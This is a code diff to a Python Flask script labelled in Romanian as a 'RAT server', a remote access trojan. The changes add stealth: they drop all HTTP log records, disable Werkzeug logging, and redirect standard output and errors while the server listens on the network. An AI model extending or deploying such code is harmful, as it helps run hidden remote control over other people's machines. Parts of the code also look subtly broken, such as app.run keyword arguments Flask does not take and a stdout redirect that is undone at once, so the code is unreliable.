@@ -9,6 +9,8 @@ import json
 import sys
 import importlib.util
 import re
+import logging
+import click
 
 # Verifică dacă un pachet este instalat
 def is_package_installed(package_name):
@@ -332,6 +334,12 @@ def update_system_info():
     except Exception as e:
         print(f"Eroare la actualizarea informațiilor de sistem: {e}")
 
+# Redirecționare ieșire
+class LogFilter(logging.Filter):
+    def filter(self, record):
+        # Filtrăm toate mesajele HTTP
+        return False
+
 # Verificăm dacă scriptul rulează direct
 if __name__ == "__main__":
     print(f"Server RAT pornit la adresa: http://{system_info['ip']}:{SERVER_PORT}")
@@ -351,5 +359,31 @@ if __name__ == "__main__":
     update_thread.daemon = True
     update_thread.start()
     
-    # Pentru a activa serverul să fie accesibil din rețea
-    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False) 
+    # Dezactivăm complet logging-ul Flask/Werkzeug
+    log = logging.getLogger('werkzeug')
+    log.disabled = True
+    log.setLevel(logging.ERROR)
+    log.addFilter(LogFilter())
+    
+    # Dezactivăm output-ul standard al Flask
+    import os, sys
+    sys.stdout = open(os.devnull, 'w')
+    
+    print("\nServerul RAT rulează acum. Pentru a opri serverul, apasă CTRL+C.\n")
+    
+    # Restaurăm stdout pentru mesajele importante
+    real_stdout = sys.__stdout__
+    sys.stdout = real_stdout
+    
+    # Redirectăm stderr pentru a captura doar erorile grave
+    sys.stderr = open('rat_server_errors.log', 'a')
+    
+    try:
+        # Pentru a activa serverul să fie accesibil din rețea, dar fără mesaje
+        app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False, use_reloader=False, 
+                log_output=False, quiet=True)
+    except Exception as e:
+        # Restaurăm stdout și afișăm eroarea
+        sys.stdout = real_stdout
+        sys.stderr = real_stdout
+        print(f"Eroare la pornirea serverului: {e}") 
